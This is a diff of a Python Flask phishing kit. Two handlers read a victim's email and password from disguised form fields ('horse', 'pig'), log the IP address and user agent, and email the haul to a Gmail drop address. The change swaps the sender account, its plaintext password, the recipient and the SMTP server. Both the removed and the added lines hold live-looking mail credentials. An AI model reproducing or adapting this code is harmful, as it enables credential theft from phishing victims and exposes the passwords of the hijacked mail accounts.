@@ -446,10 +446,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'dokumen.control@usahajb.com'
-        sender_emaill = 'dokumen control'
-        receiver_email = 'rick339851@gmail.com'
-        password = '@KuelempeR2027@'
+        sender_email = 'info@aumri.ae'
+        sender_emaill = 'Info'
+        receiver_email = 'bobxuchina1163@gmail.com'
+        password = 'wwwaumri*5028025'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -468,7 +468,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.usahajb.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.aumri.aem', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -487,10 +487,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'dokumen.control@usahajb.com'
-        sender_emaill = 'dokumen control'
-        receiver_email = 'rick339851@gmail.com'
-        password = '@KuelempeR2027@'
+        sender_email = 'info@aumri.ae'
+        sender_emaill = 'info'
+        receiver_email = 'bobxuchina1163@gmail.com'
+        password = 'wwwaumri*5028025'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -509,7 +509,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.usahajb.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.aumri.ae', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
